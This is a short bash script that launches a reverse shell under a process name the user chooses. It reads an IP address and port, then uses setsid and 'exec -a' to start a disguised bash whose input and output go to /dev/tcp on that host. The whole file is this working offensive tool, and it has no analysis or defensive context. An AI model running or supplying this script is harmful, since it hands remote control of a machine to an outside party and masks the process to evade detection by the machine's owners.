#!/bin/bash

read -p "Enter the name of the process you want: " procname
read -p "Enter your IP: " ip
read -p "Enter your PORT: " port

#rev
/usr/bin/setsid /bin/bash -c "exec -a '$procname' /bin/bash &>/dev/tcp/$ip/$port 0>&1 &" 

echo "revshell was run with your process name."
